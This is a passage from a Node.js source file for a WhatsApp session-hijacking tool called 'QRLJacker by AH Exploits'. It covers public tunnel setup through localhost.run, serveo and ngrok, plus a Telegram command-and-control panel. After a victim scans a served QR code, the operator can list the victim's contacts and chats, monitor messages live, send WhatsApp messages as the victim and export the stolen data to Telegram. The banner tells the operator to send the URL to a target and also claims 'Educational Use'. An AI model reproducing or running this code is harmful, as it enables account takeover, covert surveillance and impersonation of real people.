                 '🕐 ' + new Date().toISOString() + '\n' +
                 '🌐 IP: `' + ip + '`');
        }
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    });
  } else if (req.method === 'GET' && p === '/session_status') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ captured: STATE.open, number: STATE.victimNumber || null }));
  } else if (p === '/favicon.ico') { res.writeHead(204); res.end(); }
  else { res.writeHead(404); res.end('Not found'); }
});

/* ============================================================
   TUNNELS - localhost.run -> serveo -> ngrok (auto fallback)
   ============================================================ */
function startTunnel(cb) {
  const attempts = [
    { name: 'localhost.run',
      cmd: ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30',
            '-R', '80:localhost:' + STATE.port, 'nokey@localhost.run'],
      pat: /https:\/\/[a-zA-Z0-9.-]+\.(?:lhr\.life|lhr\.run)/ },
    { name: 'serveo.net',
      cmd: ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30',
            '-R', '80:localhost:' + STATE.port, 'serveo.net'],
      pat: /https:\/\/[a-zA-Z0-9.-]+\.serveo\.net/ },
    { name: 'ngrok', cmd: ['ngrok', 'http', String(STATE.port)], pat: null }
  ];
  let idx = 0;
  function next() {
    if (idx >= attempts.length) return cb(null);
    const a = attempts[idx++];
    if (a.name === 'ngrok' &&
        !fs.existsSync('/usr/bin/ngrok') &&
        !fs.existsSync('/data/data/com.termux/files/usr/bin/ngrok') &&
        !fs.existsSync(path.join(os.homedir(), 'ngrok'))) return next();
    log(C.Y + '[*] Trying ' + a.name + '...' + C.X);
    let proc;
    try {
      proc = spawn(a.cmd[0], a.cmd.slice(1), { stdio: ['ignore', 'pipe', 'pipe'] });
    } catch (e) { return next(); }
    STATE.tunnelProc = proc;
    let resolved = false;
    let poll = null;
    const finish = (url) => {
      if (resolved) return;
      resolved = true;
      clearTimeout(timer);
      if (poll) clearInterval(poll);
      STATE.publicUrl = url;
      cb(url);
    };
    const timer = setTimeout(() => {
      if (!resolved) { try { proc.kill(); } catch (e) {} next(); }
    }, 25000);
    proc.on('error', () => { if (!resolved) { clearTimeout(timer); next(); } });
    proc.on('exit', () => { if (!resolved) { clearTimeout(timer); if (poll) clearInterval(poll); next(); } });
    if (a.pat) {
      let buf = '';
      proc.stdout.on('data', (d) => {
        buf += d.toString();
        const lines = buf.split('\n');
        buf = lines.pop() || '';
        for (const line of lines) {
          const m = line.match(a.pat);
          if (m) return finish(m[0]);
        }
      });
    } else {
      poll = setInterval(async () => {
        try {
          const r = await fetch('http://127.0.0.1:4040/api/tunnels');
          const j = await r.json();
          for (const t of j.tunnels || []) {
            if (t.proto === 'https') return finish(t.public_url);
          }
        } catch (e) {}
      }, 2000);
    }
  }
  next();
}

/* ============================================================
   TELEGRAM CONTROL PANEL (C2)
   ============================================================ */
const kb = (rows) => ({ inline_keyboard: rows });

function mainMenuText() {
  return '🎛 *AH Exploits QRLJacker - Control Panel*\n\n' +
         '📡 Victim: ' + (STATE.victimNumber ? '`' + STATE.victimNumber + '` ✅' : '`none yet`') +
         '\n👁 Live Monitor: ' + (STATE.monitor ? '🟢 ON' : '⚫ OFF') +
         '\n👥 Contacts: ' + STATE.contacts.size + ' · 💬 Chats: ' + STATE.chats.size +
         '\n🔗 URL: `' + (STATE.publicUrl || STATE.localUrl || 'starting…') + '`' +
         '\n\n🤖 Made by AH Exploits v3.1';
}
function mainMenuKb() {
  return kb([
    [{ text: '📡 Sessions', callback_data: 'sessions' }],
    [{ text: '👥 Contacts', callback_data: 'contacts' }, { text: '💬 Chats', callback_data: 'chats' }],
    [{ text: '👁 Monitor: ' + (STATE.monitor ? 'ON' : 'OFF'), callback_data: 'mon' }],
    [{ text: 'ℹ️ Status', callback_data: 'status' }, { text: '🚪 Logout', callback_data: 'logout' }]
  ]);
}
function backKb() { return kb([[{ text: '⬅️ Back', callback_data: 'back' }]]); }
function sessionKb(jid) {
  return kb([
    [{ text: '📩 Send Message', callback_data: 'send' }, { text: '👁 Monitor ' + (STATE.monitor ? 'OFF' : 'ON'), callback_data: 'mon' }],
    [{ text: '👥 Contacts', callback_data: 'contacts' }, { text: '💬 Chats', callback_data: 'chats' }],
    [{ text: '🚪 Logout Device', callback_data: 'logout' }],
    [{ text: '⬅️ Back', callback_data: 'back' }]
  ]);
}
function sessionPanelText(jid) {
  const c = STATE.chats.get(jid);
  return '🎯 *Session: ' + jid + '*\n\n' +
         '👁 Monitor: ' + (STATE.monitor ? '🟢 ON' : '⚫ OFF') +
         '\n📝 Last message: ' + ((c && c.last) || '—');
}

async function showSessions(chat, mid) {
  const rows = STATE.victimJid
    ? [[{ text: '📱 ' + STATE.victimNumber, callback_data: 'sel_' + STATE.victimJid }]]
    : [[{ text: '⏳ Waiting for victim to scan…', callback_data: 'none' }]];
  const txt = '📡 *Linked sessions* (AH Exploits)\n\nSelect a session to control:';
  if (mid) tgEdit(mid, txt, kb(rows)); else tgSend(txt, kb(rows));
}

async function onCallback(cb) {
  const d = cb.data;
  const chat = cb.message.chat.id;
  const mid = cb.message.message_id;
  tgCall('answerCallbackQuery', { callback_query_id: cb.id });

  if (d === 'sessions')      return showSessions(chat, mid);
  if (d === 'status')        return tgEdit(mid, mainMenuText(), backKb());
  if (d === 'back')          return tgEdit(mid, mainMenuText(), mainMenuKb());
  if (d === 'none')          return;
  if (d.startsWith('sel_')) { STATE.sel = d.slice(4); return tgEdit(mid, sessionPanelText(STATE.sel), sessionKb(STATE.sel)); }
  if (d === 'mon') {
    STATE.monitor = !STATE.monitor;
    const txt = STATE.sel ? sessionPanelText(STATE.sel) : mainMenuText();
    const key = STATE.sel ? sessionKb(STATE.sel) : mainMenuKb();
    return tgEdit(mid, txt, key);
  }
  if (d === 'send') {
    STATE.prompt = { type: 'wa_send' };
    return tgEdit(mid, '✍️ Type the message text to send to `' + STATE.sel + '`…', null);
  }
  if (d === 'contacts') {
    const list = [...STATE.contacts.entries()].slice(0, 50)
      .map((e) => '• `' + e[0] + '` - ' + e[1]).join('\n') || 'No contacts synced yet';
    return tgEdit(mid, '👥 *Contacts (' + STATE.contacts.size + ')*\n\n' + list, backKb());
  }
  if (d === 'chats') {
    const list = [...STATE.chats.entries()].slice(0, 30)
      .map((e) => '• `' + e[0].split('@')[0] + '` ' + (e[1].last ? '— "' + String(e[1].last).slice(0, 40) + '"' : ''))
      .join('\n');
    return tgEdit(mid, '💬 *Chats (' + STATE.chats.size + ')*\n\n' + (list || 'None'), backKb());
  }
  if (d === 'logout') {
    try { if (STATE.sock) await STATE.sock.logout(); } catch (e) {}
    STATE.open = false;
    return tgEdit(mid, '🚪 Device logged out of victim WhatsApp.', null);
  }
}

async function tgExport() {
  const payload = {
    tool: 'QRLJacker by AH Exploits v3.1',
    captured_at: new Date().toISOString(),
    victim_number: STATE.victimNumber,
    contacts: [...STATE.contacts.entries()].map((e) => ({ number: e[0], name: e[1] })),
    chats: [...STATE.chats.entries()].map((e) => ({ jid: e[0], last: e[1].last }))
  };
  const buf = Buffer.from(JSON.stringify(payload, null, 2));
  const fd = new FormData();
  fd.append('chat_id', String(STATE.tgChat));
  fd.append('caption', '📦 QRLJacker data export - AH Exploits');
  fd.append('document', new Blob([buf], { type: 'application/json' }), 'qrljacker_export.json');
  try { await fetch(tgUrl('sendDocument'), { method: 'POST', body: fd }); } catch (e) {}
}

async function handleUpdate(u) {
  if (u.callback_query) return onCallback(u.callback_query);
  const msg = u.message;
  if (!msg || String(msg.chat.id) !== String(STATE.tgChat)) return;
  const text = (msg.text || '').trim();

  if (STATE.prompt) {
    const p = STATE.prompt;
    STATE.prompt = null;
    if (p.type === 'wa_send' && STATE.sel) {
      try {
        await STATE.sock.sendMessage(STATE.sel, { text });
        tgSend('✅ Message sent to `' + STATE.sel + '`\n📝 ' + text);
      } catch (e) { tgSend('❌ Send failed: ' + e.message); }
    }
    return;
  }

  if (text === '/start' || text === '/help') {
    tgSend('🎛 *QRLJacker C2 - AH Exploits*\n\n' +
           '`/start` control panel\n`/sessions` linked device\n`/status` live status\n' +
           '`/url` attack URL\n`/qr` fetch current QR\n`/monitor on|off` live chat monitor\n' +
           '`/contacts` /chats /numbers\n`/send <number> <text>` send WhatsApp msg\n' +
           '`/export` dump contacts+chats\n`/logout` unlink device');
  } else if (text === '/sessions')      showSessions(msg.chat.id);
  else if (text === '/status')          tgSend(mainMenuText(), mainMenuKb());
  else if (text === '/url')             tgSend('🔗 Attack URL: `' + (STATE.publicUrl || STATE.localUrl) + '`');
  else if (text === '/qr') {
    const f = path.join(SESSION_DIR, 'qr_live.png');
    if (fs.existsSync(f)) tgPhotoBuf(fs.readFileSync(f), '📱 Current real QR - AH Exploits');
    else tgSend('⚠️ No QR yet - waiting for WhatsApp to issue one.');
  } else if (text === '/monitor on')    { STATE.monitor = true;  tgSend('👁 Monitor ON - incoming chats will be forwarded here.'); }
  else if (text === '/monitor off')     { STATE.monitor = false; tgSend('👁 Monitor OFF.'); }
  else if (text === '/contacts') {
    const list = [...STATE.contacts.entries()].slice(0, 50).map((e) => '• `' + e[0] + '` - ' + e[1]).join('\n');
    tgSend('👥 *Contacts (' + STATE.contacts.size + ')*\n\n' + (list || 'None'), backKb());
  } else if (text === '/chats') {
    const list = [...STATE.chats.entries()].slice(0, 30)
      .map((e) => '• `' + e[0].split('@')[0] + '` ' + (e[1].last ? '— "' + String(e[1].last).slice(0, 40) + '"' : '')).join('\n');
    tgSend('💬 *Chats (' + STATE.chats.size + ')*\n\n' + (list || 'None'), backKb());
  } else if (text === '/numbers') {
    const list = [...STATE.contacts.keys()].slice(0, 50).map((n) => '• `' + n + '`').join('\n');
    tgSend('👥 *Numbers (' + STATE.contacts.size + ')*\n\n' + (list || 'None'), backKb());
  } else if (text === '/export')        tgExport();
  else if (text === '/logout') {
    try { if (STATE.sock) await STATE.sock.logout(); } catch (e) {}
    STATE.open = false;
    tgSend('🚪 Device logged out.');
  } else if (text.startsWith('/send ')) {
    const parts = text.split(' ');
    const num = parts[1];
    const body = parts.slice(2).join(' ');
    if (!num || !body) return tgSend('Usage: `/send <number> <text>`');
    try {
      await STATE.sock.sendMessage(num + '@s.whatsapp.net', { text: body });
      tgSend('✅ WhatsApp msg sent to `' + num + '`\n📝 ' + body);
    } catch (e) { tgSend('❌ ' + e.message); }
  } else tgSend('Unknown command - use /start');
}

async function tgPoll() {
  let offset = 0;
  while (true) {
    try {
      const r = await fetch(tgUrl('getUpdates'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ offset, timeout: 25, allowed_updates: ['message', 'callback_query'] }),
        signal: AbortSignal.timeout(90000)
      });
      const j = await r.json();
      if (j.ok) for (const u of j.result) { offset = u.update_id + 1; handleUpdate(u); }
    } catch (e) { console.error('Poll err:', e.message); }
    await new Promise((r) => setTimeout(r, 1000));
  }
}

/* ============================================================
   CLI + MAIN
   ============================================================ */
function ask(q) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((res) => rl.question(q, (a) => { rl.close(); res(a.trim()); }));
}

function printBanner() {
  console.log(C.R + C.BOLD + '  ██████   ██████  ██      ██      ██  ▄▄▄   ██▓     ▄▄▄▄   ▄▄▄        ██████   ██████ ' + C.X);
  console.log(C.M + ' ▒██    ▒ ▒██    ▒ ▒▒      ██▒ ██ ▓██▒   ▒▓██▒    ▓█████▄ ▒████▄    ▒██    ▒ ▒██    ▒ ' + C.X);
  console.log(C.M + ' ░ ▓██▄   ░ ▓██▄   ░▒     ▒██▒ ▀█▄▒██▒   ░▒██░    ▒██▒ ▄██▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   ' + C.X);
  console.log(C.B + '   ▒   ██▒  ▒   ██▒░     ░██░ ▓  ░██░    ▒██░   ▒██░█▀  ░██▄▄▄▄██   ▒   ██▒  ▒   ██▒' + C.X);
  console.log(C.B + ' ▒██████▒▒▒██████▒▒      ░██▒ ▓██░██████▒░██████▒░▓█  ▀█▓ ▓█   ▓██▒▒██████▒▒▒██████▒▒' + C.X);
  console.log(C.CY + ' ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░     ░▓  ▒ ▓░░▒▓▒  ░░▒▓▒  ░░▒▓███▀▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░' + C.X);
  console.log(C.CY + ' ░ ░▒  ░ ░░ ░▒  ░ ░      ░▒  ░ ▒░░▒ ▒   ░▒ ▒   ▒░▒   ░  ░   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░' + C.X);
  console.log(C.G + ' ░  ░  ░  ░  ░  ░        ░░   ░ ░░  ▒   ░░  ▒    ░    ░  ░   ▒   ░  ░  ░  ░  ░  ░  ' + C.X);
  console.log(C.G + '      ░        ░          ░   ░   ░     ░       ░         ░       ░        ░      ░  ' + C.X);
  console.log('');
  console.log(C.Y + C.BOLD + '                    ⚡ WhatsApp QRLJacking Framework v3.1 ⚡' + C.X);
  console.log(C.G + C.BOLD + '             REAL PROTOCOL QR • DESKTOP MODE • TG C2' + C.X);
  console.log(C.DIM + '                       Made by AH Exploits' + C.X);
  console.log(C.DIM + '                  Termux Ready • Educational Use' + C.X + '\n');
}

process.on('unhandledRejection', (e) => {
  console.error(C.R + '[!] ' + (e && e.message ? e.message : e) + C.X);
});
process.on('SIGINT', () => {
  console.log('\n' + C.Y + '[*] Shutting down...' + C.X);
  try { if (STATE.sock) STATE.sock.end(); } catch (e) {}
  if (STATE.tunnelProc) { try { STATE.tunnelProc.kill(); } catch (e) {} }
  try { server.close(); } catch (e) {}
  console.log(C.G + '[*] Cleanup complete.' + C.X);
  console.log(C.M + '[*] QRLJacker by AH Exploits' + C.X);
  process.exit(0);
});

(async () => {
  printBanner();

  /* --- setup prompts --- */
  console.log(C.CY + '='.repeat(60) + C.X);
  console.log(C.BOLD + '  Telegram Bot Configuration (optional)' + C.X);
  console.log(C.CY + '='.repeat(60) + C.X);
  STATE.tgToken = await ask(C.Y + '[?] Bot Token (Enter to skip): ' + C.X);
  STATE.tgChat = await ask(C.Y + '[?] Chat ID (Enter to skip):   ' + C.X);
  if (STATE.tgToken && STATE.tgChat) log(C.G + '[+] Telegram enabled - control panel will appear there' + C.X);

  const portIn = await ask(C.Y + '[?] Listen port (default 8080): ' + C.X);
  if (/^\d+$/.test(portIn)) STATE.port = parseInt(portIn, 10);

  /* --- local IP --- */
  let localIP = '127.0.0.1';
  for (const addrs of Object.values(os.networkInterfaces())) {
    for (const a of addrs || []) {
      if (a.family === 'IPv4' && !a.internal) { localIP = a.address; break; }
    }
    if (localIP !== '127.0.0.1') break;
  }
  STATE.localUrl = 'http://' + localIP + ':' + STATE.port;

  /* --- HTTP server --- */
  server.listen(STATE.port, '0.0.0.0', () => {
    console.log('\n' + C.R + C.BOLD + '='.repeat(60));
    console.log('  🔴 QRLJacker v3.1 - Attack Ready!');
    console.log('='.repeat(60) + C.X);
    console.log(C.G + '  📍 Local URL:  ' + C.W + STATE.localUrl + C.X);
    console.log(C.G + '  📁 Session:    ' + C.W + SESSION_DIR + C.X);
    console.log(C.G + '  📱 Send URL to target - scan = session captured' + C.X);
    console.log(C.M + '  🤖 Made by AH Exploits' + C.X);
    console.log(C.R + C.BOLD + '='.repeat(60) + C.X + '\n');
  });

  /* --- Telegram C2 polling --- */
  if (STATE.tgToken && STATE.tgChat) tgPoll();

  /* --- tunnel (localhost.run -> serveo -> ngrok) --- */
  startTunnel((url) => {
    if (url) {
      console.log(C.G + '  🌐 Public URL: ' + C.W + url + C.X);
      if (STATE.tgChat) {
        tgSend('🟢 *QRLJacker ONLINE* - AH Exploits v3.1\n\n🔗 URL: `' + url + '`\n\nSend /start for the control panel.');
      }
    } else {
      console.log(C.Y + '  ⚠️  No public tunnel - LAN only' + C.X);
      if (STATE.tgChat) {
        tgSend('🟢 *QRLJacker ONLINE* - AH Exploits v3.1\n\n🔗 LAN URL: `' + STATE.localUrl + '`\n\nSend /start for the control panel.');
      }
    }
  });

  /* --- REAL WhatsApp engine --- */
  await initWA();

  /* --- keep alive --- */
  setInterval(() => {}, 1 << 30);
})();
